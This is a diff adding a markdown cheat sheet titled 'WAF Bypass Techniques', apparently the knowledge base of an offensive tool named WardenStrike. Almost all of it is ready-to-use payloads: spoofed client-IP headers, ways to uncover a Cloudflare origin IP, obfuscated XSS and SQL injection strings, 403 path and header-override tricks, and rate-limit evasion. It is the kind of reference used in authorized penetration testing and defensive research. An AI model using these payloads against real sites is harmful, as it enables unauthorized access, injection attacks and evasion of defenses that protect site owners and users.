@@ -1,0 +1,99 @@
+# WAF Bypass Techniques - WardenStrike Knowledge Base
+
+## Cloudflare Bypass
+# Header-based
+X-Originating-IP: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+
+# Find origin IP
+# - Check historical DNS (SecurityTrails, ViewDNS)
+# - Check email headers (MX records)
+# - Check SSL certificate
+# - Search Shodan/Censys for same SSL cert hash
+# - Check subdomains pointing to origin
+
+## Generic WAF Bypass - XSS
+# Case variation
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x OnErRoR=alert(1)>
+
+# Encoding
+%3Cscript%3Ealert(1)%3C/script%3E
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+<script>alert(String.fromCharCode(88,83,83))</script>
+
+# Tag alternatives
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<math><mtext><table><mglyph><style><!--</style><img title="--><img src=x onerror=alert(1)>">
+
+# Null bytes
+<scr%00ipt>alert(1)</scr%00ipt>
+
+# Double encoding
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+
+## Generic WAF Bypass - SQLi
+# Comments
+/*!50000SELECT*/ 1
+/**/UNION/**/SELECT/**/
+UN/**/ION SE/**/LECT
+
+# Case + comments
+uNiOn/**/sElEcT
+
+# Whitespace alternatives
+UNION%0aSELECT
+UNION%0dSELECT
+UNION%09SELECT
+UNION%0bSELECT
+
+# HTTP Parameter Pollution
+?id=1&id=UNION&id=SELECT&id=1,2,3
+
+## 403 Bypass Techniques
+# Path manipulation
+/admin → /Admin → /ADMIN → /aDmIn
+/admin → /admin/
+/admin → /admin/.
+/admin → //admin
+/admin → /./admin
+/admin → /admin..;/
+/admin → /%2fadmin
+/admin → /admin%20
+/admin → /admin%09
+/admin → /.;/admin
+
+# Header tricks
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+
+# Method override
+X-HTTP-Method-Override: PUT
+X-HTTP-Method: DELETE
+X-Method-Override: PATCH
+
+## Rate Limit Bypass
+# IP rotation headers
+X-Forwarded-For: RANDOM_IP
+X-Remote-Addr: RANDOM_IP
+X-Originating-IP: RANDOM_IP
+X-Client-IP: RANDOM_IP
+
+# Null bytes in params
+username=admin%00
+password=pass%00
+
+# Case changes
+/api/login → /API/LOGIN → /Api/Login
+
+# Add parameters
+/api/login → /api/login?foo=bar
+/api/login → /api/login#
